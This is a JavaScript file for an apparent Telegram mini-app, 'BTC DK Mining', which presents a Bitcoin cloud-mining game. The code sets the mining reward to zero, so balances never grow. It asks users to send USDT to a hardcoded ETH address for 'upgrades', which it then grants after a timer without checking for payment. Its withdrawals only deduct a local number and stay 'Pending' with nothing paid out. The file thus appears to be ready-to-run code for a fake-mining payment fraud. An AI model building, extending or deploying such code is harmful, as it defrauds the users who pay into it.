// ============================================
// BTC DK MINING - PROFESSIONAL EDITION
// COMPLETE - 0.000000000000000 BTC STARTING
// ============================================

// ============================================
// TELEGRAM WEB APP INITIALIZATION
// ============================================
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.expand();
    tg.ready();
    console.log('Telegram WebApp initialized');
}

// ============================================
// GAME STATE - 0.000000000000000 BTC STARTING
// ============================================
const gameState = {
    // Balance & Mining
    balance: 0.000000000000000,
    totalMined: 0.000000000000000,
    miningSpeed: 9,
    baseMiningAmount: 0.000000000000000,
    
    // Session Management
    isAutoMining: false,
    miningSessionEnd: null,
    miningInterval: null,
    timerInterval: null,
    
    // Upgrades
    upgrades: {
        speedLevel: 0,
        efficiencyLevel: 0,
        maxSpeedLevel: 10,
        maxEfficiencyLevel: 5,
        speedCost: 29.99,
        efficiencyCost: 79.99
    },
    
    // Payment Configuration
    payments: {
        ethAddress: "0x742d35Cc6634C0532925a3b844Bc9e34F3bA2E1c"
    },
    
    // Referral System
    referral: {
        code: generateReferralCode(),
        earnings: 0,
        count: 0,
        activeCount: 0,
        referredBy: null,
        referrals: []
    },
    
    // Withdrawal History
    withdrawalHistory: []
};

// ============================================
// HELPER FUNCTIONS
// ============================================
function generateReferralCode() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    let code = 'BTC-';
    for (let i = 0; i < 8; i++) {
        code += chars[Math.floor(Math.random() * chars.length)];
        if (i === 3) code += '-';
    }
    return code;
}

function updateElement(id, value) {
    const el = document.getElementById(id);
    if (el) el.textContent = value;
}

// ============================================
// LOAD / SAVE STATE
// ============================================
function loadGameState() {
    try {
        const saved = localStorage.getItem('btcDKMining_pro');
        if (saved) {
            const parsed = JSON.parse(saved);
            if (parsed.balance !== undefined) gameState.balance = parsed.balance;
            if (parsed.totalMined !== undefined) gameState.totalMined = parsed.totalMined;
            if (parsed.upgrades) gameState.upgrades = parsed.upgrades;
            if (parsed.referral) gameState.referral = parsed.referral;
            if (parsed.withdrawalHistory) gameState.withdrawalHistory = parsed.withdrawalHistory;
            
            if (parsed.miningSessionEnd && new Date(parsed.miningSessionEnd) > new Date()) {
                gameState.miningSessionEnd = parsed.miningSessionEnd;
                gameState.isAutoMining = true;
                startMiningSession();
            }
        }
    } catch (e) {
        console.error('Error loading state:', e);
    }
    
    updateUI();
    updateUSDValues();
    updateReferralUI();
    updateWithdrawalHistory();
}

function saveGameState() {
    try {
        localStorage.setItem('btcDKMining_pro', JSON.stringify(gameState));
    } catch (e) {
        console.error('Error saving state:', e);
    }
}

// ============================================
// UI UPDATE FUNCTIONS
// ============================================
function updateUI() {
    // Balance displays
    updateElement('balance', gameState.balance.toFixed(15));
    updateElement('available-balance', gameState.balance.toFixed(15));
    updateElement('total-mined', gameState.totalMined.toFixed(15));
    
    // Mining stats
    const currentSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
    const miningAmount = gameState.baseMiningAmount * Math.pow(2, gameState.upgrades.efficiencyLevel);
    
    updateElement('mining-speed', currentSpeed);
    updateElement('mining-amount', miningAmount.toFixed(15));
    updateElement('next-reward', miningAmount.toFixed(15) + ' BTC');
    
    // Upgrade levels
    updateElement('speed-level', gameState.upgrades.speedLevel);
    updateElement('speed-level-display', gameState.upgrades.speedLevel);
    updateElement('efficiency-level', gameState.upgrades.efficiencyLevel);
    updateElement('efficiency-level-display', gameState.upgrades.efficiencyLevel);
    
    // Speed display
    updateElement('current-mining-speed', currentSpeed);
    updateElement('next-speed', Math.max(3, currentSpeed - 3));
    
    // Multiplier display
    const currentMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel);
    const nextMultiplier = Math.pow(2, gameState.upgrades.efficiencyLevel + 1);
    updateElement('current-multiplier', currentMultiplier);
    updateElement('next-multiplier', nextMultiplier);
    
    // Upgrade costs
    updateElement('speed-cost', `$${gameState.upgrades.speedCost.toFixed(2)}`);
    updateElement('efficiency-cost', `$${gameState.upgrades.efficiencyCost.toFixed(2)}`);
    
    // Mining button
    const mineBtn = document.getElementById('mine-btn');
    if (mineBtn) {
        mineBtn.innerHTML = gameState.isAutoMining ? '⚡ Mining Session Active' : '⚡ Start 2-Hour Mining Session';
        mineBtn.disabled = gameState.isAutoMining;
    }
    
    // Speed upgrade button
    const speedBtn = document.getElementById('speed-btn');
    if (speedBtn) {
        if (gameState.upgrades.speedLevel >= gameState.upgrades.maxSpeedLevel) {
            speedBtn.innerHTML = '✓ Maximum Level Reached';
            speedBtn.disabled = true;
        } else {
            speedBtn.innerHTML = `Purchase Speed Upgrade - $${gameState.upgrades.speedCost.toFixed(2)}`;
            speedBtn.disabled = false;
        }
    }
    
    // Efficiency upgrade button
    const efficiencyBtn = document.getElementById('efficiency-btn');
    if (efficiencyBtn) {
        if (gameState.upgrades.efficiencyLevel >= gameState.upgrades.maxEfficiencyLevel) {
            efficiencyBtn.innerHTML = '✓ Maximum Level Reached';
            efficiencyBtn.disabled = true;
        } else {
            efficiencyBtn.innerHTML = `Purchase Efficiency Upgrade - $${gameState.upgrades.efficiencyCost.toFixed(2)}`;
            efficiencyBtn.disabled = false;
        }
    }
    
    // Timer display
    updateTimerDisplay();
}

function updateUSDValues() {
    const balanceUSD = gameState.balance * 45000;
    updateElement('balance-usd', balanceUSD.toFixed(8));
    updateElement('available-usd', balanceUSD.toFixed(8));
}

// ============================================
// MINING FUNCTIONS
// ============================================
window.startMining = function() {
    if (gameState.isAutoMining) {
        if (tg) tg.showAlert('Mining session already active');
        return;
    }
    
    const now = new Date();
    gameState.miningSessionEnd = new Date(now.getTime() + (2 * 60 * 60 * 1000));
    gameState.isAutoMining = true;
    
    startMiningSession();
    saveGameState();
    updateUI();
    
    if (tg) tg.showAlert('✓ 2-hour mining session started');
};

function startMiningSession() {
    if (gameState.miningInterval) clearInterval(gameState.miningInterval);
    if (gameState.timerInterval) clearInterval(gameState.timerInterval);
    
    const miningSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
    const miningAmount = gameState.baseMiningAmount * Math.pow(2, gameState.upgrades.efficiencyLevel);
    
    gameState.miningInterval = setInterval(() => {
        if (!gameState.isAutoMining) return;
        
        if (new Date() >= new Date(gameState.miningSessionEnd)) {
            endMiningSession();
            return;
        }
        
        // Add mining reward
        gameState.balance = parseFloat((gameState.balance + miningAmount).toFixed(15));
        gameState.totalMined = parseFloat((gameState.totalMined + miningAmount).toFixed(15));
        
        // Process referral commission
        if (gameState.referral.referredBy) {
            const commission = miningAmount * 0.20;
            gameState.referral.earnings += commission;
        }
        
        updateUI();
        updateUSDValues();
        updateReferralUI();
        saveGameState();
        animateProgress();
        
    }, miningSpeed * 1000);
    
    gameState.timerInterval = setInterval(updateTimerDisplay, 1000);
}

function endMiningSession() {
    gameState.isAutoMining = false;
    gameState.miningSessionEnd = null;
    
    if (gameState.miningInterval) {
        clearInterval(gameState.miningInterval);
        gameState.miningInterval = null;
    }
    
    if (gameState.timerInterval) {
        clearInterval(gameState.timerInterval);
        gameState.timerInterval = null;
    }
    
    updateUI();
    saveGameState();
    
    if (tg) tg.showAlert('⏹ Mining session completed');
}

function animateProgress() {
    const progress = document.getElementById('progress');
    const progressText = document.getElementById('progress-text');
    
    if (!progress) return;
    
    progress.style.transition = 'none';
    progress.style.width = '0%';
    
    const miningSpeed = Math.max(3, gameState.miningSpeed - (gameState.upgrades.speedLevel * 3));
    
    setTimeout(() => {
        progress.style.transition = `width ${miningSpeed}s linear`;
        progress.style.width = '100%';
        
        let p = 0;
        const interval = setInterval(() => {
            p += 1;
            if (progressText) progressText.textContent = `${p}%`;
            if (p >= 100) {
                clearInterval(interval);
                if (progressText) progressText.textContent = '0%';
            }
        }, miningSpeed * 10);
    }, 10);
}

function updateTimerDisplay() {
    const timerDisplay = document.getElementById('timer-display');
    const timerLabel = document.getElementById('timer-label');
    const sessionProgress = document.getElementById('session-progress');
    
    if (!timerDisplay) return;
    
    if (gameState.isAutoMining && gameState.miningSessionEnd) {
        const diff = new Date(gameState.miningSessionEnd) - new Date();
        
        if (diff <= 0) {
            endMiningSession();
            return;
        }
        
        const hours = Math.floor(diff / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
        
        timerDisplay.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        if (timerLabel) timerLabel.textContent = 'ACTIVE MINING SESSION';
        if (sessionProgress) sessionProgress.textContent = `${hours}h ${minutes}m remaining`;
    } else {
        timerDisplay.textContent = '--:--:--';
        if (timerLabel) timerLabel.textContent = 'NO ACTIVE SESSION';
        if (sessionProgress) sessionProgress.textContent = 'No active session';
    }
}

// ============================================
// UPGRADE FUNCTIONS
// ============================================
window.buyUpgrade = function(type) {
    if (!tg) {
        alert('Opening upgrade...');
        return;
    }
    
    if (type === 'speed') {
        if (gameState.upgrades.speedLevel >= gameState.upgrades.maxSpeedLevel) {
            tg.showAlert('Maximum speed level reached');
            return;
        }
        
        tg.showConfirm(
            `⚡ Speed Upgrade\n\n` +
            `Cost: $${gameState.upgrades.speedCost} USDT\n` +
            `Send to:\n${gameState.payments.ethAddress}`,
            (confirmed) => {
                if (confirmed) {
                    tg.showAlert(`⏳ Processing upgrade...`);
                    
                    setTimeout(() => {
                        gameState.upgrades.speedLevel++;
                        gameState.upgrades.speedCost = Math.min(99.99, gameState.upgrades.speedCost + 5);
                        
                        if (gameState.isAutoMining) {
                            startMiningSession();
                        }
                        
                        updateUI();
                        saveGameState();
                        
                        tg.showAlert(`✓ Speed Level ${gameState.upgrades.speedLevel} Activated`);
                    }, 2000);
                }
            }
        );
    }
    
    if (type === 'efficiency') {
        if (gameState.upgrades.efficiencyLevel >= gameState.upgrades.maxEfficiencyLevel) {
            tg.showAlert('Maximum efficiency level reached');
            return;
        }
        
        tg.showConfirm(
            `💎 Efficiency Upgrade\n\n` +
            `Cost: $${gameState.upgrades.efficiencyCost} USDT\n` +
            `Send to:\n${gameState.payments.ethAddress}`,
            (confirmed) => {
                if (confirmed) {
                    tg.showAlert(`⏳ Processing upgrade...`);
                    
                    setTimeout(() => {
                        gameState.upgrades.efficiencyLevel++;
                        gameState.upgrades.efficiencyCost = Math.min(199.99, gameState.upgrades.efficiencyCost + 15);
                        
                        updateUI();
                        saveGameState();
                        
                        tg.showAlert(`✓ Efficiency Level ${gameState.upgrades.efficiencyLevel} Activated`);
                    }, 2000);
                }
            }
        );
    }
};

// ============================================
// REFERRAL FUNCTIONS
// ============================================
function updateReferralUI() {
    updateElement('referral-code', gameState.referral.code);
    
    const cleanCode = gameState.referral.code.replace('BTC-', '');
    updateElement('referral-link', `https://t.me/Btcdkminingbot?start=ref_${cleanCode}`);
    
    updateElement('referral-earnings', gameState.referral.earnings.toFixed(8));
    updateElement('referral-count', `${gameState.referral.count} referrals`);
    updateElement('referral-total', gameState.referral.count);
    updateElement('referral-active', `${gameState.referral.activeCount} active`);
}

window.copyReferralCode = function() {
    navigator.clipboard.writeText(gameState.referral.code);
    if (tg) tg.showAlert('✓ Referral code copied');
};

window.copyReferralLink = function() {
    const cleanCode = gameState.referral.code.replace('BTC-', '');
    navigator.clipboard.writeText(`https://t.me/Btcdkminingbot?start=ref_${cleanCode}`);
    if (tg) tg.showAlert('✓ Referral link copied');
};

// ============================================
// WITHDRAWAL FUNCTIONS
// ============================================
window.withdraw = function() {
    if (!tg) return;
    
    const amountInput = document.getElementById('withdraw-amount');
    const walletInput = document.getElementById('wallet-address');
    
    const amount = parseFloat(amountInput?.value || '0');
    const wallet = walletInput?.value.trim() || '';
    
    if (!amount || amount < 0.001) {
        tg.showAlert('Minimum withdrawal: 0.001 BTC');
        return;
    }
    
    if (amount > gameState.balance) {
        tg.showAlert(`Insufficient balance`);
        return;
    }
    
    if (!wallet || wallet.length < 26) {
        tg.showAlert('Invalid Bitcoin address');
        return;
    }
    
    const fee = 0.0001;
    const netAmount = amount - fee;
    
    if (netAmount <= 0) {
        tg.showAlert('Amount too small');
        return;
    }
    
    tg.showConfirm(
        `Withdraw ${amount.toFixed(8)} BTC?\n` +
        `Fee: ${fee} BTC\n` +
        `You receive: ${netAmount.toFixed(8)} BTC`,
        (confirmed) => {
            if (confirmed) {
                gameState.balance = parseFloat((gameState.balance - amount).toFixed(15));
                
                gameState.withdrawalHistory.unshift({
                    id: Date.now(),
                    date: new Date().toISOString(),
                    netAmount: netAmount,
                    status: 'pending'
                });
                
                updateUI();
                updateUSDValues();
                updateWithdrawalHistory();
                saveGameState();
                
                if (amountInput) amountInput.value = '';
                if (walletInput) walletInput.value = '';
                updateReceiveAmount();
                
                tg.showAlert(`✓ Withdrawal submitted`);
            }
        }
    );
};

function updateWithdrawalHistory() {
    const list = document.getElementById('history-list');
    if (!list) return;
    
    if (gameState.withdrawalHistory.length === 0) {
        list.innerHTML = '<div style="text-align: center; padding: 25px; background: rgba(255,255,255,0.02); border-radius: 16px; color: #5a6a78;">No withdrawal history</div>';
        return;
    }
    
    let html = '';
    gameState.withdrawalHistory.slice(0, 5).forEach(item => {
        const date = new Date(item.date).toLocaleDateString();
        html += `
            <div class="history-item">
                <div>
                    <div style="font-size: 14px; font-weight: 600; color: white;">${item.netAmount.toFixed(8)} BTC</div>
                    <div style="font-size: 11px; color: #5a6a78;">${date}</div>
                </div>
                <span class="status-badge">Pending</span>
            </div>
        `;
    });
    
    list.innerHTML = html;
}

window.setMaxWithdraw = function() {
    const input = document.getElementById('withdraw-amount');
    if (input) {
        input.value = gameState.balance.toFixed(8);
        updateReceiveAmount();
    }
};

function updateReceiveAmount() {
    const amount = parseFloat(document.getElementById('withdraw-amount')?.value || '0');
    const receive = amount - 0.0001;
    const receiveEl = document.getElementById('receive-amount');
    
    if (receiveEl) {
        receiveEl.textContent = receive > 0 ? receive.toFixed(8) + ' BTC' : '0.00000000 BTC';
    }
}

// ============================================
// UTILITY FUNCTIONS
// ============================================
window.copyAddress = function() {
    navigator.clipboard.writeText(gameState.payments.ethAddress);
    if (tg) tg.showAlert('✓ Address copied');
};

// ============================================
// TAB SWITCHING
// ============================================
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() {
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        this.classList.add('active');
        
        const tabId = this.getAttribute('data-tab');
        document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.add('hidden'));
        document.getElementById(`${tabId}-tab`).classList.remove('hidden');
    });
});

// ============================================
// AUTO-SAVE
// ============================================
setInterval(saveGameState, 30000);

// ============================================
// INITIALIZATION
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    console.log('BTC DK Mining initializing...');
    
    // Withdrawal amount listener
    const withdrawInput = document.getElementById('withdraw-amount');
    if (withdrawInput) {
        withdrawInput.addEventListener('input', updateReceiveAmount);
    }
    
    // Load saved state
    loadGameState();
    
    // Welcome message
    if (!localStorage.getItem('btcDKMining_welcome') && tg) {
        setTimeout(() => {
            tg.showAlert(
                '⚡ BTC DK MINING\n\n' +
                'Starting: 0.000000000000000 BTC\n' +
                '2H Sessions • 20% Referral • USDT Upgrades'
            );
            localStorage.setItem('btcDKMining_welcome', 'true');
        }, 1000);
    }
    
    console.log('All functions ready');
});
